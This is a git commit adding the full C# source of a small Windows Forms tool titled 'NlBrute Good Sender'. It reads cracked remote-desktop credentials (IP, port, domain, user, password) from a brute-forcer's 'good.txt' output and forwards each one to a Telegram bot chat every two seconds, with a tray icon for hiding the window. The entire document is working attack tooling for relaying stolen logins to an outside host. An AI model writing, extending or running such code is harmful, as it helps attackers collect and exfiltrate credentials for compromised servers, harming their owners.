f17afba8da128df5a08cf7f61a3bd431e83be355
Alirezatz <86472836+Alirezatz@users.noreply.github.com>
2025-05-16 09:10:23 -0700

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,137 @@
+﻿namespace WindowsFormsApp1
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.label3 = new System.Windows.Forms.Label();
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(182, 76);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Connect";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(12, 12);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(69, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "BOT_Token:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(12, 46);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(112, 13);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "ChatID(@userinfobot):";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(87, 10);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(389, 20);
+            this.textBox1.TabIndex = 3;
+            // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.Location = new System.Drawing.Point(130, 44);
+            this.numericUpDown1.Maximum = new decimal(new int[] {
+            1410065407,
+            2,
+            0,
+            0});
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.Size = new System.Drawing.Size(217, 20);
+            this.numericUpDown1.TabIndex = 4;
+            // 
+            // label3
+            // 
+            this.label3.ForeColor = System.Drawing.Color.Green;
+            this.label3.Location = new System.Drawing.Point(263, 81);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(227, 17);
+            this.label3.TabIndex = 5;
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
+            this.notifyIcon1.Text = "notifyIcon1";
+            this.notifyIcon1.Visible = true;
+            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(488, 107);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.numericUpDown1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "NlBrute Good Sender";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,126 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace WindowsFormsApp1
+{
+    public partial class Form1 : Form
+    {
+        
+        HttpClient client = new HttpClient();
+        List<string> Sended = new List<string>();
+        string TOken_BOT = "";
+        long CHATID_USER = 0;
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
+            try
+            {
+                if (File.Exists("Data.txt"))
+                {
+                    string[] Data = File.ReadAllLines("Data.txt");
+                    textBox1.Text = Data[0];
+                    numericUpDown1.Value = Convert.ToInt64(Data[1]);
+
+                }
+            }
+            catch { }
+        }
+
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            File.WriteAllLines("Data.txt", new string[] { textBox1.Text, numericUpDown1.Value.ToString() });
+            CHATID_USER = Convert.ToInt64(numericUpDown1.Value);
+            TOken_BOT = textBox1.Text;
+            label3.ForeColor = Color.Orange;
+            label3.Text = "Please Wait....";
+            if(await BOTName())
+            {
+                button1.Enabled = false;
+                await RUN();
+            }
+            else
+            {
+                label3.ForeColor = Color.Red;
+                label3.Text = "Error";
+            }
+            
+        }
+
+
+        async Task RUN()
+        {
+            label3.ForeColor = Color.Green;
+            await SendTelegramMessage("BOT Connected!");
+            while (true)
+            {
+                if (File.Exists("good.txt"))
+                {
+                    string[] FileGood = File.ReadAllLines("good.txt");
+                    foreach (var n in FileGood)
+                    {
+                        if (!Sended.Exists(x => x == n))
+                        {
+                            Sended.Add(n);
+                            var Temp = Regex.Match(n, @"^(.*?):(.*?)@(.*?)\\(.*?);(.*)").Groups;
+                            string MessageTelegram = $"🌐 IP Address: {Temp[1].Value}\r\n💠 PORT: {Temp[2].Value}\r\n⚔️ Domain: {Temp[3].Value}\r\n👤 USER: {Temp[4].Value}\r\n♨️ PASSWORD: {Temp[5].Value}";
+                            await SendTelegramMessage(MessageTelegram);
+                        }
+                    }
+                }
+                await Task.Delay(2000);
+            }
+        }
+
+        async Task SendTelegramMessage(string messageText)
+        {
+            var sendMessageUrl = $"https://api.telegram.org/bot{TOken_BOT}/sendMessage";
+            var content = new FormUrlEncodedContent(new[]
+            {
+            new KeyValuePair<string, string>("chat_id", CHATID_USER.ToString()),
+            new KeyValuePair<string, string>("text", messageText)
+            });
+
+            await client.PostAsync(sendMessageUrl, content);
+        }
+
+        async Task<bool> BOTName()
+        {
+            try
+            {
+
+                string apiUrl = $"https://api.telegram.org/bot{TOken_BOT}/getMe";
+                string INFO = await client.GetStringAsync(apiUrl);
+                label3.Text = $"Connected({Regex.Match(INFO, "\"username\":\"(.*?)\"").Groups[1].Value})!";
+                return true;
+            }
+            catch (Exception Ex) { MessageBox.Show($"Error: {Ex.Message}","Error",MessageBoxButtons.OK,MessageBoxIcon.Error); return false; }
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            if(this.WindowState== FormWindowState.Normal||this.WindowState == FormWindowState.Maximized)
+            {
+                this.WindowState = FormWindowState.Minimized;
+                this.Hide();
+            }
+            else //if(this.WindowState==FormWindowState.Minimized)
+            {
+                this.Show();
+                this.WindowState = FormWindowState.Normal;
+                
+            }
+        }
+    }
+}
